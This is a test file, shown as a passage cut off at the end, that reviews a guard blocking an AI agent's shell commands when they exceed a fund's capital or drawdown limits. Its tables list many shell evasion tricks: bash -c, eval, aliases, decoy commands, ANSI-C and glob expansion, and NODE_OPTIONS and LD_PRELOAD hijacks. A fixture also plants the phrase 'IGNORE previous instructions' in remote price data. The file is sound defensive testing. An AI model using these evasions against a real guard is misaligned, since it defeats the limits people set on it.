"""The independent review of PR #41 (3709d4b): its bypass table, one test per row, plus the
state-machine, cooldown, host-signer and symbol findings.

Fund: 40 USDG max capital, 1000 bps max drawdown; an attempt is 4000 USDG / 9000 bps unless noted.
"""
from __future__ import annotations

import asyncio
import shlex
import tempfile
from unittest.mock import AsyncMock, patch

import pytest

from sherwood_monitor import session
from sherwood_monitor.fund.guard import make_fund_guard
from sherwood_monitor.fund.models import Leg, ProposalRecord
from sherwood_monitor.fund.runtime import FundRuntime
from sherwood_monitor.fund.service import FundService
from sherwood_monitor.fund.settings import FundSettings
from sherwood_monitor.fund.signed_cli import propose_portfolio_command
from sherwood_monitor.fund.store import LocalJsonBackend
from sherwood_monitor.hooks import make_pre_tool_call_hook
from sherwood_monitor.propose_cmd import FUND_RULES_APPLIED
from tests.fund_helpers import Clock, fund, host_agent

VAULT = "0x2fD6056d9326e07Eec9Ba4499078C328E4F38b4A"
OTHER = "0x" + "99" * 20
TAIL = "--tokens TSLA --weights 10000 --duration 6h"


@pytest.fixture(autouse=True)
def operator_turn(monkeypatch):
    monkeypatch.setattr(session, "_session_env", lambda name: "")  # a hermes -z one-shot, not a chat turn


def make_rt(signer: str = "agent") -> FundRuntime:
    svc = FundService(LocalJsonBackend(tempfile.mkdtemp()), clock=Clock(), proposal_signer=signer)
    svc.create_fund(fund(vault=VAULT, max_capital="40000000", max_drawdown_bps=1000, voting_period=1800), host_agent())
    return FundRuntime(svc, FundSettings(agent_name="alpha", owner_telegram_id="900", proposal_signer=signer), None)


RT = None


def rt() -> FundRuntime:
    global RT
    if RT is None:
        RT = make_rt()
    return RT


def shipped() -> str:
    st = rt().service.load("alpha-fund")
    record = ProposalRecord(
        id="p-1", proposer_agent="alpha", thesis="TSLA and NVDA into the next session", topic="t",
        legs=[Leg(summary="TSLA", symbol="TSLA", weight_bps=5000), Leg(summary="NVDA", symbol="NVDA", weight_bps=5000)],
        max_capital="40000000", max_drawdown_bps=1000, strategy_duration=21600,
    )
    return propose_portfolio_command(st.fund, record)


def over() -> str:
    return shipped().replace("--amount 40 ", "--amount 4000 ").replace("--max-drawdown-bps 1000 ", "--max-drawdown-bps 9000 ")


def run(command: str, tool: str = "terminal"):
    """(hook result, fund guard result, state-fetcher calls)."""
    fetched: list[str] = []

    async def fetch(sub):
        fetched.append(sub)
        # CLI 0.103.0: no machine-readable vault state (None), so the general rule fails open

    guard = make_fund_guard(rt())
    out = asyncio.run(make_pre_tool_call_hook(state_fetcher=fetch, fund_guard=guard)(tool_name=tool, args={"command": command}))
    return out, guard(tool, {"command": command}), fetched


CL = (f"sherwood strategy propose concentrated-liquidity --vault {VAULT} --amount 1 --collateral-amount 4000 "
      f"--borrow-amount 2000 --market-id 0x{'ab' * 32} --pair-token TSLA --pool-fee 3000 --range-pct 5 "
      "--max-drawdown-bps 1000 --duration 6h")
CREATE = (f"sherwood proposal create --vault {VAULT} --name x --description y --duration 6h --execute-calls e.json "
          f"--settle-calls s.json --strategy 0x{'88' * 20}")

# (row, command builder, expected): "pass" = allowed under the fund rules; otherwise the block code.
ROWS = [
    ("shipped command", lambda: shipped(), "pass"),
    ("shipped, 4000/9000", lambda: over(), "exceeds_max_capital"),
    ("--amount= attached", lambda: shipped().replace("--amount 40 ", "--amount=4000 "), "exceeds_max_capital"),
    ("--max-drawdown-bps= attached", lambda: shipped().replace("--max-drawdown-bps 1000 ", "--max-drawdown-bps=9000 "), "exceeds_max_drawdown"),
    ("lowercase vault", lambda: over().replace(VAULT, VAULT.lower()), "exceeds_max_capital"),
    ("0X vault (the CLI rejects it too)", lambda: over().replace(VAULT, "0X" + VAULT[2:].upper()), "vault_not_literal"),
    ("&& chain", lambda: shipped() + " && " + over(), "exceeds_max_capital"),
    ("; other vault first", lambda: f"sherwood strategy propose portfolio --vault {OTHER} --amount 1 {TAIL}; " + over(), "exceeds_max_capital"),
    ("| pipe", lambda: "echo y | " + over(), "exceeds_max_capital"),
    ("( ) subshell", lambda: "(" + over() + ")", "exceeds_max_capital"),
    ("env X=1", lambda: "env X=1 " + over(), "environment"),
    ("npx sherwood", lambda: "npx " + over(), "exceeds_max_capital"),
    ("absolute path", lambda: "/usr/local/bin/" + over(), "exceeds_max_capital"),
    ("--chain before the subcommand", lambda: over().replace("sherwood ", "sherwood --chain robinhood-mainnet ", 1), "exceeds_max_capital"),
    ("--calldata-only", lambda: over().replace("sherwood ", "sherwood --calldata-only ", 1), "exceeds_max_capital"),
    ("here-doc", lambda: "bash <<'EOF'\n" + over() + "\nEOF", "shell_indirection"),
    # H1: newline / `;(` / `|&` used to merge two commands into one parsed invocation.
    ("H1 newline, then another vault", lambda: over() + f"\nsherwood strategy propose portfolio --vault {OTHER} --amount 1 {TAIL}", "exceeds_max_capital"),
    ("H1 newline, 9000 then a 1000 one", lambda: shipped().replace("--max-drawdown-bps 1000 ", "--max-drawdown-bps 9000 ") + "\n" + shipped(), "exceeds_max_drawdown"),
    ("H1 ;( separator", lambda: over() + f";(sherwood strategy propose portfolio --vault {OTHER} --amount 1 {TAIL})", "exceeds_max_capital"),
    ("H1 |& separator", lambda: over() + f" |& sherwood strategy propose portfolio --vault {OTHER} --amount 1 {TAIL}", "exceeds_max_capital"),
    ("H1 backslash-newline continuation", lambda: over().replace("strategy propose", "strategy \\\npropose"), "exceeds_max_capital"),
    # H2: `#` outside quotes, both directions.
    ("H2 # mid-word, later flags bash keeps", lambda: f"sherwood strategy propose portfolio --vault {VAULT} {TAIL} --amount 40 --max-drawdown-bps 1000 --name=a#b --amount 4000 --max-drawdown-bps 9000", "unquoted_hash"),
    ("H2 # comment, tail bash drops", lambda: shipped().replace("--amount 40 ", "--amount 4000 ") + " # --amount 40", "unquoted_hash"),
    ("H2 # quoted is fine", lambda: shipped().replace("'--name=", "'--name=Fund#2 "), "pass"),
    # H3: the capital each template really deploys.
    ("H3 concentrated-liquidity --collateral-amount", lambda: CL, "exceeds_max_capital"),
    ("H3 concentrated-liquidity without --collateral-amount", lambda: CL.replace("--collateral-amount 4000 ", ""), "no_amount"),
    ("H3 concentrated-liquidity within the ceiling", lambda: CL.replace("4000", "40").replace("--borrow-amount 2000", "--borrow-amount 20"), "pass"),
    ("H3 unmapped template", lambda: f"sherwood strategy propose aerodrome-lp --vault {VAULT} --amount 1 --amount-a 4000 --max-drawdown-bps 1000", "unmapped_template"),
    ("H3 launchpad without --max-drawdown-bps (derived)", lambda: f"sherwood strategy propose launchpad --vault {VAULT} --asset-in 10", "no_drawdown"),
    # M1: indirection.
    ("M1 strategy 'propose'", lambda: over().replace("strategy propose", "strategy 'propose'"), "exceeds_max_capital"),
    ('M1 "strategy" propose', lambda: over().replace("strategy propose", '"strategy" propose'), "exceeds_max_capital"),
    ("M1 pro\\pose", lambda: over().replace("propose", "pro\\pose", 1), "exceeds_max_capital"),
    ("M1 bash -c", lambda: "bash -c " + shlex.quote(over()), "shell_indirection"),
    ('M1 sh -c "..."', lambda: 'sh -c "' + over().replace("'", "") + '"', "shell_indirection"),
    ("M1 eval", lambda: "eval " + shlex.quote(over()), "shell_indirection"),
    ("M1 $(echo sherwood)", lambda: over().replace("sherwood ", "$(echo sherwood) ", 1), "shell_expansion"),
    ("M1 `which sherwood`", lambda: over().replace("sherwood ", "`which sherwood` ", 1), "shell_expansion"),
    ("M1 $S binary", lambda: "S=sherwood; " + over().replace("sherwood ", "$S ", 1), "shell_expansion"),
    ("M1 --vault $V", lambda: f"V={VAULT}; " + over().replace(f"--vault {VAULT}", "--vault $V"), "shell_expansion"),
    ("M1 --vault $(cat f)", lambda: over().replace(f"--vault {VAULT}", "--vault $(cat /tmp/v)"), "shell_expansion"),
    ("M1 npx @sherwoodagent/cli", lambda: over().replace("sherwood ", "npx @sherwoodagent/cli ", 1), "exceeds_max_capital"),
    ("M1 node .../@sherwoodagent/cli/dist/index.js", lambda: over().replace("sherwood ", "node /x/node_modules/@sherwoodagent/cli/dist/index.js ", 1), "exceeds_max_capital"),
    ("M1 npx @sherwoodagent/cli within the ceiling", lambda: shipped().replace("sherwood ", "npx @sherwoodagent/cli@0.103.0 ", 1), "pass"),
    # Repeats: the guard takes the largest; the vault the CLI uses is the last one.
    ("repeated --amount 4000 then 40", lambda: shipped().replace("--amount 40 ", "--amount 4000 --amount 40 "), "exceeds_max_capital"),
    ("repeated --amount 40 then 4000", lambda: shipped().replace("--amount 40 ", "--amount 40 --amount 4000 "), "exceeds_max_capital"),
    ("repeated drawdown 9000 then 1000", lambda: shipped().replace("--max-drawdown-bps 1000 ", "--max-drawdown-bps 9000 --max-drawdown-bps 1000 "), "exceeds_max_drawdown"),
    ("repeated --vault fund then other", lambda: over().replace(f"--vault {VAULT}", f"--vault {VAULT} --vault {OTHER}"), "unreadable_propose"),
    ("repeated --vault other then fund", lambda: over().replace(f"--vault {VAULT}", f"--vault {OTHER} --vault {VAULT}"), "exceeds_max_capital"),
    # Number spellings.
    ("--amount 40.0", lambda: shipped().replace("--amount 40 ", "--amount 40.0 "), "pass"),
    ("--amount 4e1", lambda: shipped().replace("--amount 40 ", "--amount 4e1 "), "bad_amount"),
    ("--amount 4e3", lambda: shipped().replace("--amount 40 ", "--amount 4e3 "), "bad_amount"),
    ("--amount 0x28", lambda: shipped().replace("--amount 40 ", "--amount 0x28 "), "bad_amount"),
    ("--amount -40", lambda: shipped().replace("--amount 40 ", "--amount -40 "), "bad_amount"),
    ("--amount 1e400", lambda: shipped().replace("--amount 40 ", "--amount 1e400 "), "bad_amount"),
    ("--amount 40USDG", lambda: shipped().replace("--amount 40 ", "--amount 40USDG "), "bad_amount"),
    ("--amount .5", lambda: shipped().replace("--amount 40 ", "--amount .5 "), "bad_amount"),
    ("--amount 40,0", lambda: shipped().replace("--amount 40 ", "--amount 40,0 "), "exceeds_max_capital"),
    ("--amount 4_000", lambda: shipped().replace("--amount 40 ", "--amount 4_000 "), "exceeds_max_capital"),
    ("--amount ' 4000'", lambda: shipped().replace("--amount 40 ", "--amount ' 4000' "), "exceeds_max_capital"),
    ("--max-drawdown-bps 0x2328", lambda: shipped().replace("--max-drawdown-bps 1000 ", "--max-drawdown-bps 0x2328 "), "bad_drawdown"),
    ("--max-drawdown-bps 9e3", lambda: shipped().replace("--max-drawdown-bps 1000 ", "--max-drawdown-bps 9e3 "), "bad_drawdown"),
    ("--max-drawdown-bps -1 (the CLI refuses below 0)", lambda: shipped().replace("--max-drawdown-bps 1000 ", "--max-drawdown-bps -1 "), "pass"),
    # Vault and flags.
    ("vault by name (the CLI refuses it: isAddress)", lambda: over().replace(VAULT, "alpha-fund"), "vault_not_literal"),
    ("no --vault (CLI 0.103.0 requires it)", lambda: over().replace(f"--vault {VAULT} ", ""), "no_vault"),
    ("legacy proposal create <sub> --size-usd", lambda: "sherwood proposal create alpha-fund --protocol moonwell --size-usd 4000", "no_vault"),
    ("proposal create --max-capital 4000", lambda: CREATE + " --max-capital 4000 --max-drawdown-bps 1000", "exceeds_max_capital"),
    ("proposal create, no drawdown", lambda: CREATE + " --max-capital 40", "exceeds_max_drawdown"),
    ("lighter --deposit 4000 --amount 40", lambda: f"sherwood strategy propose lighter-perp --vault {VAULT} --deposit 4000 --amount 40 --max-drawdown-bps 1000", "exceeds_max_capital"),
    ("launchpad --asset-in 4000 --amount 1", lambda: f"sherwood strategy propose launchpad --vault {VAULT} --asset-in 4000 --amount 1 --max-drawdown-bps 1000", "exceeds_max_capital"),
    ("generic-call --calls plan.json --amount 40", lambda: f"sherwood strategy propose generic-call --vault {VAULT} --calls /tmp/plan.json --amount 40 --max-drawdown-bps 1000 --duration 6h", "pass"),
    ("unbalanced quote", lambda: over() + " '", "unreadable_command"),
]


@pytest.mark.parametrize("row, build, expected", ROWS, ids=[r[0] for r in ROWS])
def test_bypass_table_row(row, build, expected):
    command = build()
    out, verdict, fetched = run(command)
    if expected == "pass":
        assert out is None and verdict is FUND_RULES_APPLIED, (row, out)
        assert fetched == []  # the fund rules replace the general one: no vault-state read
    else:
        assert out is not None and out["action"] == "block", (row, command)
        assert f"({expected})" in out["message"], (row, out["message"])


def test_execute_code_is_outside_the_terminal_guard():
    """Bypass-table row `execute_code`: not a terminal tool, so this guard never sees it (pre-existing
    scope); the deployment boundary (no code tools in a fund group) is the control."""
    out, verdict, _ = run(over(), tool="execute_code")
    assert out is None and verdict is None


@pytest.mark.parametrize("command", [
    "sherwood strategy propose --help",
    "sherwood strategy propose portfolio --help",
    "sherwood proposal create --help",
    f"sherwood vault info --vault {VAULT}",
    "grep -n 'strategy propose' README.md",
    f"sherwood vault add --vault {VAULT} --wallet 0x{'44' * 20} --agent-id 202",
])
def test_reads_and_help_are_not_blocked(command):
    """L1: help prints usage and proposes nothing; reads of the fund vault are not proposes."""
    out, _, _ = run(command)
    assert out is None, out


# == H4: re-recording the current status still stores a new on-chain id, tx or card ==========
def test_a_repeated_status_stores_a_new_onchain_id_and_the_chain_sync_follows():
    svc = make_rt().service
    svc.claim_topic("alpha-fund", "alpha", "t")
    svc.draft_proposal("alpha-fund", "alpha", topic="t", thesis="t", legs=[Leg(summary="TSLA", symbol="TSLA", weight_bps=10000)],
                       max_capital=40_000_000, max_drawdown_bps=1000, strategy_duration=21600)
    events = []
    svc.subscribe(events.append)
    assert svc.set_proposal_status("alpha-fund", "alpha", "p-1", "proposed").onchain_id is None  # no id yet
    rec = svc.set_proposal_status("alpha-fund", "alpha", "p-1", "voting", onchain_id=7)
    assert (rec.status, rec.onchain_id) == ("voting", 7)
    rec = svc.set_proposal_status("alpha-fund", "alpha", "p-1", "proposed", tx_hash="0x" + "ab" * 32, card_message_id="55")
    assert (rec.status, rec.propose_tx, rec.card_message_id) == ("voting", "0x" + "ab" * 32, "55")
    n = len(events)
    svc.set_proposal_status("alpha-fund", "alpha", "p-1", "voting", onchain_id=7)  # nothing new: no event
    assert len(events) == n
    card = {"data": {"proposals": {"open": [{"id": "7", "state": "GuardianReview", "reviewEnd": "1800003600"}]}}}
    assert svc.apply_chain_card("alpha-fund", card) == 1
    assert svc.load("alpha-fund").proposal("7").status == "review"


# == M2: a cooldown read must be a sane unix time; formatting a bad one never raises ===========
@pytest.mark.parametrize("bad", ["1800003600000", "1e400", "Infinity", "-5", "nan"])
def test_an_insane_chain_cooldown_is_ignored(bad):
    from sherwood_monitor.fund import rules
    from sherwood_monitor.fund.cards import render_fund_card

    svc = make_rt().service
    svc.apply_chain_card("alpha-fund", {"data": {"proposeGate": {"cooldownUntil": bad}}})
    st = svc.load("alpha-fund")
    assert st.fund.cooldown_until is None
    assert rules.check_cooldown(st, svc.clock()).ok
    render_fund_card(st, now=svc.clock())  # renders
    svc.apply_chain_card("alpha-fund", {"data": {"proposeGate": {"cooldownUntil": str(int(svc.clock()) + 600)}}})
    assert svc.load("alpha-fund").fund.cooldown_until == int(svc.clock()) + 600


def test_time_formatting_never_raises():
    from sherwood_monitor.fund import cards, rules

    for ts in (float("inf"), 1e30, float("nan")):
        assert cards.hhmm(ts) == "an unknown time"
        assert rules._hhmm(ts) == "an unknown time"


def test_a_stored_infinite_cooldown_does_not_break_checks_or_cards():
    from sherwood_monitor.fund import rules
    from sherwood_monitor.fund.cards import render_fund_card

    svc = make_rt().service

    def poison(state):
        state.fund.cooldown_until = float("inf")  # written by an older build

    svc.backend.update("alpha-fund", poison)
    st = svc.load("alpha-fund")
    verdict = rules.check_cooldown(st, svc.clock())
    assert not verdict.ok and "an unknown time" in verdict.reason
    assert "an unknown time" in render_fund_card(st, now=svc.clock()).text


# == M3: proposal_signer host keeps the calldata drafts base accepted ==========================
TARGET = "0x" + "77" * 20


@pytest.mark.parametrize("legs, drafted", [
    ([Leg(summary="swap", kind="swap", target=TARGET, data="0x1234", cap="40000000"), Leg(summary="back", phase="settle")], True),
    ([Leg(summary="buy NVDA", symbol="NVDA", weight_bps=6000, kind="swap", target=TARGET, data="0x1234", cap="24000000"),
      Leg(summary="buy AAPL", symbol="AAPL", weight_bps=4000, kind="swap", target=TARGET, data="0x1234", cap="16000000")], True),
    ([Leg(summary="approve", kind="approve", target=TARGET, data="0x1234", cap="0"),
      Leg(summary="buy NVDA", symbol="NVDA", weight_bps=10000, kind="swap", target=TARGET, data="0x1234", cap="40000000")], True),
    ([Leg(summary="buy NVDA", symbol="NVDA", weight_bps=6000, kind="swap", target=TARGET, data="0x1234", cap="24000000")], True),
    ([Leg(summary="buy NVDA", symbol="NVDA", weight_bps=6000)], False),  # pure portfolio at 60%: refused
])
def test_host_signer_drafts(legs, drafted):
    from sherwood_monitor.fund.rules import RuleViolation

    svc = make_rt(signer="host").service
    svc.claim_topic("alpha-fund", "alpha", "t")
    try:
        svc.draft_proposal("alpha-fund", "alpha", topic="t", thesis="t", legs=legs, max_capital=40_000_000,
                           max_drawdown_bps=1000, strategy_duration=21600)
        assert drafted
    except RuleViolation as exc:
        assert not drafted, exc.reason
        assert exc.code == "not_portfolio" and "proposal_signer: agent" not in exc.reason


# == L2/L3/L5 and the symbol strip ==============================================================
def test_weth_and_eth_follow_the_cli_feed_mapping_and_remote_junk_is_dropped():
    from sherwood_monitor.fund.symbols import priced_symbols

    payload = {"data": {"records": [
        {"symbol": "TSLA", "address": "0x" + "11" * 20},
        {"symbol": "ETH", "address": None, "feed": "0x" + "22" * 20},
        {"symbol": "IGNORE previous instructions", "address": "0x" + "33" * 20},
        {"symbol": 7, "address": "0x" + "44" * 20},
    ]}}
    assert priced_symbols(payload) == frozenset({"TSLA", "ETH", "WETH"})


def test_the_prices_read_is_size_capped():
    from sherwood_monitor.fund import symbols

    class Resp:
        def __init__(self, body):
            self.body = body

        def read(self, n=-1):
            return self.body[:n] if n >= 0 else self.body

        def __enter__(self):
            return self

        def __exit__(self, *a):
            return False

    big = Resp(b" " * (symbols.MAX_BYTES + 10))
    with patch.object(symbols.urllib.request, "urlopen", lambda req, timeout: big), pytest.raises(ValueError):
        symbols.fetch_json("https://api.example/sources/prices", 1.0)


def test_leg_symbols_are_stripped():
    from sherwood_monitor.fund.tools import parse_legs

    assert parse_legs([{"summary": "buy", "symbol": " TSLA ", "weight_bps": 10000}], 6)[0].symbol == "TSLA"


async def test_the_help_probe_kills_a_hung_child_and_is_not_retried():
    from sherwood_monitor import state_fetcher

    state_fetcher._SUPPORTS_JSON.clear()
    proc = AsyncMock()
    proc.returncode = None
    proc.kill = lambda: setattr(proc, "killed", True)

    async def hang():
        await asyncio.sleep(10)

    proc.communicate = hang
    calls = []

    async def fake_exec(*argv, **kw):
        calls.append(argv)
        return proc

    with patch("asyncio.create_subprocess_exec", fake_exec), patch.object(state_fetcher, "HELP_TIMEOUT_S", 0.01):
        assert await state_fetcher.vault_info_supports_json("sherwood") is False
        assert await state_fetcher.vault_info_supports_json("sherwood") is False
    assert getattr(proc, "killed", False) and len(calls) == 1
    state_fetcher._SUPPORTS_JSON.clear()


# == Delta review of b79f378 =====================================================================
BASE_P = f"sherwood strategy propose portfolio --vault {VAULT} --tokens TSLA --weights 10000 --duration 6h"
OK_P = BASE_P + " --amount 40 --max-drawdown-bps 1000"
OVER_P = BASE_P + " --amount 4000 --max-drawdown-bps 9000"

DELTA_ROWS = [
    # N1: commander runs these (the help token is an option's value, or an operand after `--`).
    ("N1 --name -h", OVER_P + " --name -h", "exceeds_max_capital"),
    ("N1 --description --help", OVER_P + " --description --help", "exceeds_max_capital"),
    ("N1 -- -h", OVER_P + " -- -h", "exceeds_max_capital"),
    ("N1 a help call does not hide a fund vault", f"sherwood strategy propose --vault {VAULT} --help; bash -c {shlex.quote(OVER_P)}", "shell_indirection"),
    ("N1 help with --vault and an amount is checked", f"sherwood --calldata-only strategy propose portfolio --vault {VAULT} --amount 4000 -h", "exceeds_max_capital"),
    # N2: expansions bash performs before the CLI sees its words.
    ("N2 $'...' desync hides --amount", OK_P + " --name $'\\'' --amount 4000 x\\'", "shell_expansion"),
    ("N2 $'...' desync hides --max-drawdown-bps", OK_P + " --name $'\\'' --max-drawdown-bps 9000 x\\'", "shell_expansion"),
    ("N2 brace expansion", OK_P + " --{amount,amount}=4000", "shell_expansion"),
    ("N2 ${X:-...}", OK_P + " ${X:---amount=4000}", "shell_expansion"),
    ("N2 $(...) inside a readable propose", OK_P + " $(echo --amount=4000)", "shell_expansion"),
    ("N2 backticks", OK_P + " `printf -- --amou%s=4000 nt`", "shell_expansion"),
    ('N2 "$X" in double quotes', OK_P + ' "$X"', "shell_expansion"),
    ("N2 glob that a planted file would match", OK_P + " --amou?t=4000", "shell_expansion"),
    ("N2 process substitution", OK_P + " <(true) --amount 4000", "shell_expansion"),
    ("N2 xargs adds arguments", "echo --amount=4000 | xargs " + OK_P, "unlisted_command"),
    ("N2 sudo", "sudo " + OVER_P.replace("4000", "40").replace("9000", "1000"), "unlisted_command"),
    # The splitter: an escaped backslash before a newline is not a continuation.
    ("escaped backslash then newline", "echo x\\\\\n" + OVER_P, "exceeds_max_capital"),
    # Own re-read of the parser against bash + commander.
    ("SHERWOOD in capitals (macOS runs it)", "SHERWOOD" + OVER_P[len("sherwood"):], "exceeds_max_capital"),
    ("a propose from variables naming the CLI", "sherwood strategy propose portfolio --vault $V --amount 4000", "shell_expansion"),
    ("watch reruns it", "watch -n 5 " + OK_P, "unlisted_command"),
    ("find -exec adds {}", f"find . -name x -exec {OK_P} {{}} \\;", "shell_expansion"),
    ("a value-taking legacy flag cannot swallow --amount", OK_P.replace("--amount 40", "--protocol --amount 4000"), "exceeds_max_capital"),
]


@pytest.mark.parametrize("row, command, expected", DELTA_ROWS, ids=[r[0] for r in DELTA_ROWS])
def test_delta_review_row(row, command, expected):
    out, _verdict, _ = run(command)
    assert out is not None and f"({expected})" in out["message"], (row, out)


@pytest.mark.parametrize("command", [
    OK_P,
    OK_P + " '--description=a; b && c | d # e $HOME `x` {a,b} *'",  # all of it single-quoted
    OK_P + " --name=a\\#b",  # an escaped # is literal in bash too
    "timeout 600 " + OK_P,
    "npx -y @sherwoodagent/cli@0.103.0 " + OK_P[len("sherwood "):],
    "if true; then " + OK_P + "; fi",
    "cd /tmp && " + OK_P,
])
def test_literal_proposes_still_pass(command):
    out, verdict, _ = run(command)
    assert out is None and verdict is FUND_RULES_APPLIED, out


def test_the_plugins_own_commands_pass_with_spaces_and_shell_characters():
    """Both shipped commands quote every value: a thesis with ; ' # $ ` and a plan path with spaces pass."""
    from sherwood_monitor.fund.generic_call import propose_generic_call_command

    st = rt().service.load("alpha-fund")
    thesis = "route; it's #1 $HOME `x` {a,b} *? [x] <(y)"
    record = ProposalRecord(
        id="p-1", proposer_agent="alpha", thesis=thesis, topic="my topic #2 $X",
        legs=[Leg(summary="TSLA", symbol="TSLA", weight_bps=10000)],
        max_capital="40000000", max_drawdown_bps=1000, strategy_duration=21600,
    )
    portfolio = propose_portfolio_command(st.fund, record)
    gc = ProposalRecord(id="p-2", proposer_agent="alpha", thesis=thesis, topic="t", max_capital="40000000",
                        max_drawdown_bps=1000, strategy_duration=21600,
                        generic_call={"executeCalls": [], "settleCalls": [], "settlePatches": [], "sweepTokens": []})
    generic = propose_generic_call_command(st.fund, gc, "/Users/My Name/.hermes/plugins/sherwood-monitor/funds/a b/p-2.json")
    for command in (portfolio, generic):
        out, verdict, _ = run(command)
        assert out is None and verdict is FUND_RULES_APPLIED, (command, out)


def test_a_huge_command_is_refused_quickly():
    import time as _time

    command = OK_P + " '--description=" + "x" * (1024 * 1024) + "'"
    t0 = _time.monotonic()
    out, _, _ = run(command)
    assert _time.monotonic() - t0 < 2.0
    assert out is not None and "(command_too_long)" in out["message"]
    assert run("echo " + "y" * 40_000)[0] is None  # not a propose: not this guard's business


def test_a_repeated_status_refuses_a_conflicting_or_duplicate_onchain_id():
    from sherwood_monitor.fund.rules import RuleViolation

    svc = make_rt().service
    for topic in ("a", "b"):
        svc.claim_topic("alpha-fund", "alpha", topic)
        svc.draft_proposal("alpha-fund", "alpha", topic=topic, thesis="t",
                           legs=[Leg(summary="TSLA", symbol="TSLA", weight_bps=10000)],
                           max_capital=40_000_000, max_drawdown_bps=1000, strategy_duration=21600)
        if topic == "a":
            svc.set_proposal_status("alpha-fund", "alpha", "p-1", "proposed", onchain_id=9)
            svc.set_proposal_status("alpha-fund", "alpha", "p-1", "vetoed")
            clock = svc.clock
            clock.advance(3601)  # past the veto cooldown
    with pytest.raises(RuleViolation) as exc:
        svc.set_proposal_status("alpha-fund", "alpha", "p-2", "proposed", onchain_id=9)
    assert exc.value.code == "duplicate_onchain_id" and "p-1" in exc.value.reason
    svc.set_proposal_status("alpha-fund", "alpha", "p-2", "proposed", onchain_id=10)
    with pytest.raises(RuleViolation) as exc:
        svc.set_proposal_status("alpha-fund", "alpha", "p-2", "voting", onchain_id=11)
    assert exc.value.code == "onchain_id_conflict" and "#10" in exc.value.reason
    assert svc.load("alpha-fund").proposal("p-2").onchain_id == 10
    assert svc.set_proposal_status("alpha-fund", "alpha", "p-2", "voting", onchain_id=10).onchain_id == 10  # same id: fine


@pytest.mark.parametrize("period, stored", [("3600000", 3600), ("30", 3600), ("7200", 7200), ("2592000", 2592000)])
def test_cooldown_period_is_bounded_like_the_cooldown_end(period, stored):
    svc = make_rt().service
    svc.apply_chain_card("alpha-fund", {"data": {"governor": {"cooldownPeriod": period}}})
    assert svc.load("alpha-fund").fund.cooldown_period == stored


# == Second delta review of 1e311fb: the strict rules key on the CLI or a fund vault being named ==========
CREATE_P = (f"sherwood proposal $'\\x63reate' --vault {VAULT} --name x --description y --duration 6h "
            f"--execute-calls e.json --settle-calls s.json --strategy 0x{'88' * 20} --max-capital 4000 --max-drawdown-bps 9000")

DELTA2_ROWS = [
    # R1: the subcommand word built by an expansion the old "propose" trigger never saw.
    ("R1 ANSI-C hex 'propose'", f"sherwood strategy $'\\x70ropose' portfolio --vault {VAULT} {TAIL} --amount 4000 --max-drawdown-bps 9000", "shell_expansion"),
    ("R1 ANSI-C octal 'propose'", f"sherwood strategy $'\\160ropose' portfolio --vault {VAULT} {TAIL} --amount 4000 --max-drawdown-bps 9000", "shell_expansion"),
    ("R1 ANSI-C 'create'", CREATE_P, "shell_expansion"),
    ("R1 $(printf) 'propose'", f"sherwood strategy \"$(printf '\\x70ropose')\" portfolio --vault {VAULT} {TAIL} --amount 4000 --max-drawdown-bps 9000", "shell_expansion"),
    ("R1 glob propos[e]", f"sherwood strategy propos[e] portfolio --vault {VAULT} {TAIL} --amount 4000 --max-drawdown-bps 9000", "shell_expansion"),
    ("R1 glob propos?", f"sherwood strategy propos? portfolio --vault {VAULT} {TAIL} --amount 4000 --max-drawdown-bps 9000", "shell_expansion"),
    ("R1 sherwood built from quotes", f"sher'wood' strategy propos[e] portfolio --vault {VAULT} --amount 4000", "shell_expansion"),
    # R2: a decoy propose that never runs next to a hidden one.
    ("R2 decoy + bash -c", f"false && {OK_P}; bash -c '{OVER_P}'", "shell_indirection"),
    ("R2 decoy + sh <<< here-string", f"true || {OK_P}\nsh <<< '{OVER_P}'", "shell_indirection"),
    ("R2 decoy + echo | sh", f"false && {OK_P}; echo '{OVER_P}' | sh", "shell_indirection"),
    ("R2 calldata-only decoy + bash -c", f"sherwood --calldata-only strategy propose portfolio --vault {VAULT} {TAIL} --amount 40 --max-drawdown-bps 1000 --proposer 0x{'11' * 20} --metadata-uri ipfs://x; bash -c '{OVER_P}'", "shell_indirection"),
    ("R2 decoy + alias", f"shopt -s expand_aliases\nalias sw='{OVER_P}'\nfalse && {OK_P}\nsw", "shell_indirection"),
    ("R2 decoy + here-doc apostrophe desync", f"false && {OK_P}\ncat >/dev/null <<'EOF'\nit's\nEOF\n{OVER_P}\ncat >/dev/null <<'EOF'\n'\nEOF", "shell_indirection"),
    ("R2 function definition", f"f() {{ {OVER_P}; }}; false && {OK_P}; f", "shell_indirection"),
    ("R2 source a file next to a decoy", f"false && {OK_P}; source /tmp/p.sh", "shell_indirection"),
    ("R2 python -c naming the CLI and the vault", f"python3 -c \"import subprocess; subprocess.run(['sherwood','strategy','propose','portfolio','--vault','{VAULT}'])\"", "unlisted_command"),
    # R3: environment that changes what the CLI runs.
    ("R3 NODE_OPTIONS prefix", f"printf '%s' 'process.argv.push(\"--amount\",\"4000\")' > /tmp/r2probe/x.js\nNODE_OPTIONS=--require=/tmp/r2probe/x.js {OK_P}", "environment"),
    ("R3 export NODE_OPTIONS earlier", f"export NODE_OPTIONS=--require=/tmp/x.js; {OK_P}", "environment"),
    ("R3 PATH assignment earlier", f"PATH=/tmp/evil:/usr/bin; {OK_P}", "environment"),
    ("R3 env LD_PRELOAD", f"env LD_PRELOAD=/tmp/x.so {OK_P}", "environment"),
    ("R3 node --require before the dist", f"node --require=/tmp/x.js /x/node_modules/@sherwoodagent/cli/dist/index.js {OK_P[len('sherwood '):]}", "unsafe_launcher"),
    # R4: extglob, shopt.
    ("R4 extglob @(...)", f"touch -- --amount=4000\nshopt -s extglob\n{OK_P} @(--amount=4000)", "shell_expansion"),
    ("R4 extglob +(...)", OK_P + " +(--amount=4000)", "shell_expansion"),
    ("R4 extglob !(...)", OK_P + " !(x)", "shell_expansion"),
    ("R4 shopt alone", f"shopt -s nullglob; {OK_P}", "shell_indirection"),
    ("R4 alias chain", f"shopt -s expand_aliases\nalias 1000='1000 ' tail1='--amount=4000'\n{OK_P} tail1", "shell_indirection"),
]


@pytest.mark.parametrize("row, command, expected", DELTA2_ROWS, ids=[r[0] for r in DELTA2_ROWS])
def test_delta2_review_row(row, command, expected):
    out, _verdict, _ = run(command)
    assert out is not None and f"({expected})" in out["message"], (row, out)
    assert "on its own line with literal arguments" in out["message"] or expected in ("exceeds_max_capital",)


@pytest.mark.parametrize("command", [
    "grep -rn propose skills/*.md",  # R6: no CLI, no vault named
    'echo "next propose at $(date)"',
